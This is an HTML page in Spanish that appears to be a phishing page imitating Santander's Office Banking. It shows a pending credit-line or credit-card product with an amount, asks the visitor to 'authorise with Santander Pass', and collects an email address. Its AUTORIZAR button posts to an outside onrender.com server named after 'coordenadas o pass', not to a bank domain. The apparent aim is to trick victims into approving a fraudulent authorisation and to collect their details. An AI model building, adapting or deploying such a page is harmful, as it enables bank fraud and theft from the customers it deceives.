<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Autorización</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="style.css">
  <style>
    h1 {
      color: red;          
      text-transform: uppercase; 
      text-align: center;
    }
    .monto-box {
      background: #abc111 !important;
      color: #fff !important;
      padding: 8px 12px;
      border-radius: 6px;
      font-size: 15px;
      font-weight: bold;
      display: inline-block;
      margin-left: 8px;
    }
    .sub-text {
      margin-top: 10px;
      font-size: 13px;
      color: #333;
      text-align: center;
    }
    .seleccion-texto {
      text-align: center;
      margin: 15px 0;
      font-size: 15px;
      font-weight: bold;
    }
    .autorizar-texto {
      text-align: center;
      font-size: 14px;
      margin-top: 10px;
      font-weight: bold;
    }
    .clave-texto {
      text-align: center;
      font-size: 11px;
      color: #666;
      margin-top: 5px;
    }
    .btn-center {
      display: block;
      margin: 20px auto;
    }
    .email-confirmacion {
      text-align: center;
      font-size: 12px;
      color: #666;
      margin-top: 15px;
    }
    .email-confirmacion input {
      width: 80%;
      max-width: 400px;
      padding: 6px;
      margin-left: 10px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="logo-office-banking.png" alt="Office Banking" class="logo">

    <h1>Autorización requerida</h1>
    <div class="sub-text">Estás solicitando el siguiente producto:</div>

    <div class="seleccion-texto" id="seleccionProducto"></div>

    <!-- Texto adicional antes del botón -->
    <div class="autorizar-texto">Autorizar con Santander Pass</div>
    <div class="clave-texto">Clave única de 6 dígitos con su App Santander Pass</div>

    <button class="btn-santander btn-center" id="autorizarBtn">
      AUTORIZAR<span class="bg-arrow"></span>
    </button>

    <!-- Nueva frase y campo de correo debajo del botón -->
    <div class="email-confirmacion">
      Email Confirmación 
      <input type="email" id="emailConfirmacion" placeholder="tuemail@ejemplo.com">
    </div>

    <div id="mensaje"></div>
  </div>

  <script>
    // Formato CLP
    function formatoCLP(valor){
      return new Intl.NumberFormat("es-CL", {
        style: "currency",
        currency: "CLP",
        minimumFractionDigits: 0,
        maximumFractionDigits: 0
      }).format(valor);
    }

    document.addEventListener("DOMContentLoaded", () => {
      const producto1 = localStorage.getItem("producto1") || "Línea de Crédito";
      const monto1 = localStorage.getItem("lineaMonto") || 5000000;
      const producto2 = localStorage.getItem("producto2") || "Tarjeta de Crédito WorldMember Limited Business";
      const monto2 = localStorage.getItem("tarjetaMonto") || monto1;

      const seleccion = localStorage.getItem("seleccionProducto");

      let texto = "";
      if(seleccion === "linea"){
        texto = producto1 + " por <span class='monto-box'>" + formatoCLP(monto1) + "</span>";
      } else if(seleccion === "tarjeta"){
        texto = producto2 + " por <span class='monto-box'>" + formatoCLP(monto2) + "</span>";
      } else {
        texto = "No se ha seleccionado producto.";
      }

      document.getElementById("seleccionProducto").innerHTML = texto;
    });

    document.getElementById("autorizarBtn").addEventListener("click", async function(){
      document.getElementById("mensaje").innerText = "Enviando Autorización a tu Santander Pass...";

      try {
        const response = await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/autorizar", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ mensaje: "Autorizar!!!" })
        });

        if(response.ok){
          document.getElementById("mensaje").innerText = "✅ Autorización enviada";
        } else {
          document.getElementById("mensaje").innerText = "⚠️ Error al enviar autorización.";
        }
      } catch (error) {
        document.getElementById("mensaje").innerText = "⚠️ No se pudo conectar con el servidor.";
      }
    });
  </script>
</body>
</html>
